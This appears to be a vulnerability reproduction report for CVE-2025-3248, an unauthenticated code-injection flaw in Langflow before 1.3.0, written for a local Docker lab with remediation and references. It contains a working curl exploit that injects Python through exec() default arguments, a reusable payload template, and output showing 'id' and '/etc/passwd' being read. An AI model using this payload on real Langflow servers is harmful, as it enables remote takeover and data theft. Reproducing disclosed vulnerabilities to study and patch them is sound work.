# CVE-2025-3248 Vulnerability Reproduction Report

## Vulnerability Information

- **CVE ID**: CVE-2025-3248
- **CWE**: CWE-94 (Improper Control of Generation of Code / Code Injection)
- **CVSS**: 9.8 (Critical)
- **Affected Software**: Langflow < 1.3.0
- **Vulnerable Endpoint**: `/api/v1/validate/code`

## Vulnerability Description

Langflow versions prior to 1.3.0 are susceptible to code injection in the `/api/v1/validate/code` endpoint. A remote and unauthenticated attacker can send crafted HTTP requests to execute arbitrary code.

## Root Cause

The `/api/v1/validate/code` endpoint uses Python's `exec()` function to validate user-submitted code without proper authentication or input sanitization. An attacker can inject malicious Python code that gets executed on the server.

## Environment

- **Target**: http://localhost:7860
- **Docker Image**: langflowai/langflow:1.2.0
- **Host OS**: Linux

## Reproduction Steps

1. Start the vulnerable environment:
```bash
docker-compose up -d
```

2. Wait for the service to start (about 30-60 seconds)

3. Send a malicious request to the vulnerable endpoint:
```bash
curl -X POST http://localhost:7860/api/v1/validate/code \
  -H "Content-Type: application/json" \
  -d '{"code": "def poc(cd=exec('\''raise Exception(__import__(\"subprocess\").check_output(\"id\", shell=True))'\'')):\n    pass"}'
```

## POC Execution Result

### Command: `id`
```
[*] Target: http://localhost:7860
[*] Command: id
[*] Sending exploit...
[+] SUCCESS - Command executed!
[+] Output:
uid=1000(user) gid=0(root) groups=0(root)
```

### Command: `cat /etc/passwd`
```
[*] Target: http://localhost:7860
[*] Command: cat /etc/passwd
[*] Sending exploit...
[+] SUCCESS - Command executed!
[+] Output:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
user:x:1000:0::/app/data:/bin/sh
```

## Payload Analysis

The exploit uses Python's default argument evaluation to execute code during function definition parsing:

```python
def poc(cd=exec('raise Exception(__import__("subprocess").check_output("COMMAND", shell=True))')):
    pass
```

When Langflow's code validator parses this function definition, the default argument expression is evaluated, causing arbitrary command execution.

## Impact

- **Confidentiality**: High - Attackers can read sensitive files
- **Integrity**: High - Attackers can modify system files
- **Availability**: High - Attackers can disrupt service

## Remediation

Upgrade to Langflow version 1.3.0 or later, which adds authentication requirements for the code validation endpoint.

## References

- https://nvd.nist.gov/vuln/detail/CVE-2025-3248
- https://github.com/langflow-ai/langflow
- https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/
